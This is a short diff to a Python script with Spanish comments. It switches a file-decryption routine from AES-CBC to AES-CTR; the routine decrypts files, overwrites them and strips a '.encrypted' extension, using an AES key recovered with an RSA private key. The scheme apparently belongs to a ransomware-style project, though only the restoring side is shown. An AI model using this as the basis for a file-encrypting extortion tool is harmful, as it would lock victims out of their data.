@@ -22,15 +22,15 @@ def decrypt_aes_key_encrypted (rsa_private_key, aes_key_encrypted):
 def decrypt_file(file, aes_key_decrypted):
     try:
         with open(file, "rb") as f:
-            iv_and_encrypted_data = f.read()
-        iv = iv_and_encrypted_data[:16]  # El IV ocupa los primeros 16 bytes
-        encrypted_data = iv_and_encrypted_data[16:]
-        cipher = AES.new(aes_key_decrypted, AES.MODE_CBC, iv)
-        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+            nonce_and_encrypted_data = f.read()
+        nonce = nonce_and_encrypted_data[:8]  # El nonce ocupa los primeros 8 bytes
+        encrypted_data = nonce_and_encrypted_data[8:]
+        cipher = AES.new(aes_key_decrypted, AES.MODE_CTR, nonce=nonce)
+        decrypted_data = cipher.decrypt(encrypted_data)
         with open(file, "wb") as f:
             f.write(decrypted_data)  # Sobrescribimos el archivo con los datos descifrados
         file_decrypted = file[:-10]  # Elimina la extensión '.encrypted'
-        os.rename(file, file_decrypted) # Renombramos el archivo, eliminando la extensión '.encrypted'
+        os.rename(file, file_decrypted)  # Renombramos el archivo, eliminando la extensión '.encrypted'
         print(f"Archivo descifrado: {file} -> {file_decrypted}")
     except Exception as e:
         print(f"Error descifrando {file}: {e}")
